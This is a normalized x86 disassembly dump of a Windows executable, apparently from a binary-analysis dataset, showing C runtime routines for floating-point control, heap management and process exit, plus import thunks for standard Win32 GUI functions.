jmp r-xdata
cmp eax esi
jne r-xdata
call sub_423b1b
push eax
mov [ ebp - 0x8 ] eax
call sub_424bec
pop ecx
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
xor eax eax
test dl dl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or edx 0x300
jmp r-xdata
test edx 0x200
je r-xdata
push 0x10
pop eax
mov ecx eax
xor ecx [ ebp - 0x10 ]
or eax [ ebp - 0x10 ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or eax 0x8
or eax 0x80000000
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi edx
je r-xdata
or eax 0x1
mov ecx edx
and ecx edi
je r-xdata
or eax 0x80000
and edx ebx
sub edx 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax esi
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
jmp r-xdata
sub edx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_424946
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
ja r-xdata
lea ecx [ ebx + 0x1 ]
xor edx edx
cmp ecx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov ecx [ eax ]
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov ebx ecx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_424b4b
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_424b76
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rwxdata ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rwxdata ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rwxdata ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_424bec
push 0x8
push r--data
call sub_40f510
xor eax eax
cmp [ rwxdata ] eax
je r-xdata
call sub_40f555
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rwxdata ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_424ca6
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rwxdata ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
call sub_424bce
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0xc ]
not eax
or eax 0xffff807f
and eax esi
or eax ecx
push eax
call sub_424bec
pop ecx
sub_401000
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp ecx 0xffffffff
jae r-xdata
pop ebp
retn
push ecx
call sub_40b9ce
add esp 0x4
sub_401020
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
call sub_40b955
add esp 0x4
sub_401040
mov [ rwxdata ] sub_401000
mov [ rwxdata ] sub_401020
test eax eax
je r-xdata
test ecx ecx
je r-xdata
mov [ rwxdata ] eax
retn
mov [ rwxdata ] ecx
sub_401070
test eax eax
je r-xdata
test ecx ecx
je r-xdata
mov edx [ rwxdata ]
mov [ eax ] edx
retn
mov eax [ rwxdata ]
mov [ ecx ] eax
sub_401090
test eax eax
jne r-xdata
push eax
call [ rwxdata ]
add esp 0x4
retn
retn
sub_4010d0
test eax eax
je r-xdata
retn
push eax
call [ rwxdata ]
pop ecx
sub_4010e0
xor ecx ecx
mov [ eax + 0x3c ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x40 ] ecx
retn
sub_401ac0
push ebp
mov ebp esp
mov ecx [ eax + 0x44 ]
mov dl [ ebp + 0x8 ]
mov [ ecx ] dl
inc [ eax + 0x44 ]
pop ebp
retn
sub_4039f0
xor ecx ecx
mov [ eax + 0x3c ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x40 ] ecx
retn
sub_4043d0
push ebp
mov ebp esp
mov ecx [ eax + 0x44 ]
mov dl [ ebp + 0x8 ]
mov [ ecx ] dl
inc [ eax + 0x44 ]
pop ebp
retn
sub_4066f0
xor ecx ecx
mov [ eax + 0x3c ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x40 ] ecx
retn
sub_4070d0
push ebp
mov ebp esp
mov ecx [ eax + 0x44 ]
mov dl [ ebp + 0x8 ]
mov [ ecx ] dl
inc [ eax + 0x44 ]
pop ebp
retn
sub_409720
mov eax r--data
retn
sub_409b60
cmp [ rwxdata ] 0xfffffffd
jne r-xdata
mov eax 0x1
retn
cmp [ rwxdata ] 0xfffffffe
jne r-xdata
cmp [ rwxdata ] 0xffffffff
jne r-xdata
xor eax eax
retn
sub_409c20
retn
sub_409c30
lea eax [ ecx + 0x3 ]
shr eax 0x2
add eax eax
add eax eax
sub eax ecx
retn
sub_409cc0
push eax
push ecx
push edx
call sub_411080
add esp 0xc
retn
sub_409cd0
push eax
push ecx
push edx
call sub_40ba70
add esp 0xc
retn
sub_409ce0
push eax
push ecx
push edx
call sub_4105f0
add esp 0xc
retn
sub_409cf0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
pop ebp
retn
sub_409d00
mov eax r--data
retn
sub_409d10
mov eax 0x10300
retn
sub_409d20
mov eax r--data
retn
sub_409d30
mov eax r--data
retn
sub_409d40
mov eax r--data
retn
sub_409d50
mov eax r--data
retn
sub_40a0e0
mov [ rwxdata ] eax
call sub_409e80
mov eax 0x1
retn
DialogBoxParamA
jmp [ DialogBoxParamA@IAT ]
LoadCursorA
jmp [ LoadCursorA@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
LoadAcceleratorsA
jmp [ LoadAcceleratorsA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
TranslateAcceleratorA
jmp [ TranslateAcceleratorA@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExA
jmp [ RegisterClassExA@IAT ]
GetMessageA
jmp [ GetMessageA@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
sub_40be55
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e776
add esp 0x10
pop ebp
retn
sub_40bf2e
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40e870
pop ecx
pop ecx
pop ebp
retn
sub_40bf43
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40e8a9
pop ecx
pop ecx
pop ebp
retn
sub_40bf58
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e88c
add esp 0xc
pop ebp
retn
sub_40bf71
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e8c5
add esp 0xc
pop ebp
retn
sub_40c041
call sub_40f26f
cmp [ rwxdata ] 0x0
je r-xdata
push [ rwxdata ]
call sub_40b955
pop ecx
retn
call sub_40eff6
sub_40c1d3
call sub_40bf8a
add eax 0x20
push eax
push 0x1
call sub_40c110
pop ecx
pop ecx
retn
sub_40c1e6
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f7b4
add esp 0xc
pop ebp
retn
sub_40c1ff
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f7d1
add esp 0xc
pop ebp
retn
sub_40c218
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_40f7d1
add esp 0xc
pop ebp
retn
sub_40c230
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f7ee
add esp 0xc
pop ebp
retn
sub_40c249
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_40f7ee
add esp 0xc
pop ebp
retn
sub_40c28b
mov eax [ rwxdata ]
or eax 0x1
xor ecx ecx
cmp [ rwxdata ] eax
sete cl
mov eax ecx
retn
sub_40c353
push [ ebp + 0x8 ]
call sub_40c0d4
pop ecx
retn
sub_40c35d
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c2a1
add esp 0xc
pop ebp
retn
sub_40c577
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40c3bb
add esp 0x14
pop ebp
retn
sub_40c618
push [ ebp + 0x18 ]
call sub_40c0d4
pop ecx
retn
sub_40c622
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40c594
add esp 0x14
pop ebp
retn
sub_40c741
push [ ebp + 0x8 ]
call sub_40c0d4
pop ecx
retn
sub_40c74b
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410775
add esp 0x10
pop ebp
retn
sub_40c767
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410795
add esp 0x10
pop ebp
retn
sub_40c783
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410795
add esp 0x10
pop ebp
retn
sub_40c79e
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4107b5
add esp 0x10
pop ebp
retn
sub_40c7ba
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4107b5
add esp 0x10
pop ebp
retn
sub_40ca04
push [ ebp + 0x14 ]
call sub_40c0d4
pop ecx
retn
sub_40ca0e
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41160c
add esp 0xc
pop ebp
retn
sub_40ca24
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_411637
add esp 0x10
pop ebp
retn
sub_40ca3d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40ca0e
sub_40ca48
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40ca24
sub_40ca53
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41193a
add esp 0xc
pop ebp
retn
sub_40ca69
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_411965
add esp 0x10
pop ebp
retn
sub_40cb5b
push esi
call sub_40c0d4
pop ecx
retn
sub_40cb8e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40cb63
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_40cba6
push 0x8
call sub_40f40a
pop ecx
retn
sub_40cbaf
push 0x8
call sub_40f319
pop ecx
retn
sub_40ce4e
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40f319
pop ecx
sub_40ce63
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40cd23
add esp 0xc
pop ebp
retn
sub_40ce79
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_40cd23
add esp 0xc
pop ebp
retn
sub_40ce8f
push 0x1
push 0x0
push 0x0
call sub_40cd23
add esp 0xc
retn
sub_40ce9e
push 0x1
push 0x1
push 0x0
call sub_40cd23
add esp 0xc
retn
sub_40d06a
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_412c42
pop ecx
pop ecx
retn
sub_40d07e
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40ce9e
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40f555
retn
push eax
call sub_40ce79
_start
call sub_4131e2
jmp sub_40cf3b
sub_40d2cf
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rwxdata ] eax
mov eax ecx
retn
sub_40d2ed
push [ rwxdata ]
call [ HeapDestroy@IAT ]
and [ rwxdata ] 0x0
retn
sub_40d301
mov eax [ rwxdata ]
retn
sub_40d536
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_40d57c
push 0x0
call sub_40d545
pop ecx
retn
sub_40d585
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_40d6bd
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rwxdata ] eax
xor eax eax
retn
sub_40d8b8
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx + 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40d8c6
mov eax ecx
retn
sub_40d96f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_40d981
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_40d996
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_40e555
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_40e6b4
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_40e6e6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e6c1
int3
sub_40e76b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40e700
sub_40e7fa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e776
add esp 0x10
pop ebp
retn
sub_40e870
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40e814
add esp 0x10
pop ebp
retn
sub_40e88c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40e814
add esp 0x10
pop ebp
retn
sub_40e8a9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40e814
add esp 0x10
pop ebp
retn
sub_40e8c5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40e814
add esp 0x10
pop ebp
retn
sub_40ea76
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e9ff
add esp 0x14
pop ebp
retn
sub_40eeb0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
sub_40f089
push 0x1
call sub_40f319
pop ecx
retn
sub_40f1e4
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_40c110
pop ecx
pop ecx
retn
sub_40f213
push 0x1
call sub_40f319
pop ecx
retn
sub_40f265
push [ ebp + 0x8 ]
call sub_40c0d4
pop ecx
retn
sub_40f26f
push 0x1
call sub_40f142
pop ecx
retn
sub_40f319
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rwxdata ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40f330
push [ esp + 0x4 ]
push 0x0
call [ FatalAppExitA@IAT ]
push 0xff
call sub_40cb8e
sub_40f401
push 0xa
call sub_40f319
pop ecx
retn
sub_40f555
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40f570
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
jmp sub_40b946
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40b946
sub_40f7ac
push esi
call sub_40c0d4
pop ecx
retn
sub_40f7b4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40f7d1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_415dbd
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40f7ee
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40f80b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40f827
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_415dbd
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40f843
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40f72f
add esp 0x10
pop ebp
retn
sub_40fc20
push 0x1
call sub_40f319
pop ecx
retn
sub_40fd06
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40fc30
add esp 0xc
pop ebp
retn 0x4
sub_40fd39
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_417995
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40fd6b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40fc30
add esp 0xc
pop ebp
retn 0x8
sub_410549
push ebx
call sub_417bc6
pop ecx
retn
sub_41076b
push [ ebp + 0xc ]
call sub_40c0d4
pop ecx
retn
sub_410775
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_41066a
add esp 0x14
pop ebp
retn
sub_410795
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_415dbd
call sub_41066a
add esp 0x14
pop ebp
retn
sub_4107b5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_41066a
add esp 0x14
pop ebp
retn
sub_4107d5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_41066a
add esp 0x14
pop ebp
retn
sub_4107f4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_415dbd
call sub_41066a
add esp 0x14
pop ebp
retn
sub_410813
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_41066a
add esp 0x14
pop ebp
retn
sub_411071
push ebx
call sub_417bc6
pop ecx
retn
sub_411637
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_4113e1
add esp 0x14
pop ebp
retn
sub_411680
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_4113e1
add esp 0x14
pop ebp
retn
sub_411965
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_41169d
add esp 0x14
pop ebp
retn
sub_4119ae
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_41169d
add esp 0x14
pop ebp
retn
sub_411b23
push ebx
call sub_417bc6
pop ecx
retn
sub_411b5c
push 0x8
push r--data
call sub_40f510
call sub_41258b
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4191b4
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_411b7c
xor eax eax
inc eax
retn
sub_411ba8
push 0x8
push r--data
call sub_40f510
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_411b5c
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_411bcc
xor eax eax
inc eax
retn
sub_411bd0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411b5c
sub_411be0
push sub_411b5c
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
retn
sub_411bf1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
pop ebp
retn
sub_411c8b
push edi
call sub_40f319
pop ecx
retn
sub_411ce2
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_411cef
call sub_41258b
add eax 0x64
retn
sub_411cf8
call sub_41258b
add eax 0x60
retn
sub_411f06
push 0x0
call sub_40f319
pop ecx
retn
sub_4120a8
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40f319
pop ecx
sub_4120e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41238f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41239e
push 0x0
call [ EncodePointer@IAT ]
retn
sub_4123a7
call [ TlsAlloc@IAT ]
retn 0x4
sub_4123b0
mov edi edi
push ebp
mov ebp esp
